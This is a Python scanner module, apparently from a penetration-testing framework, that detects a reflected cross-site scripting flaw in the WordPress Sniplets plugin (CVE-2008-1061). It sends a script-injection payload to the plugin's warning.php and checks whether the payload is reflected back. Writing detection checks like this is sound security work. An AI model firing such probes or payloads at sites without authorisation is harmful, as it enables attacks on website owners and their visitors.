#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Sniplets 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Sniplets <=1.2.2 - Cross-Site Scripting Detection',
        'description': 'WordPress Sniplets 1.1.2 and 1.2.2 plugin contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via the text parameter to warning.php, notice.php, and inset.php in view/sniplets/, and possibly modules/execute.php; via the url parameter to view/admin/submenu.php; and via the page parameter to view/admin/pager.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2008', 'cve', 'xss', 'wp-plugin', 'wp', 'edb', 'wpscan', 'wordpress', 'sniplets', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/5194',
            'https://wpscan.com/vulnerability/d0278ebe-e6ae-4f7c-bcad-ba318573f881',
            'https://nvd.nist.gov/vuln/detail/CVE-2008-1061',
            'http://securityreason.com/securityalert/3706',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/40830',
        ],
        'cve': 'CVE-2008-1061',
    }

    def run(self):
        path = '/wp-content/plugins/sniplets/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Code Snippets',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Sniplets <=1.2.2 - Cross-Site Scripting detected', path=path)
            return True
        return False

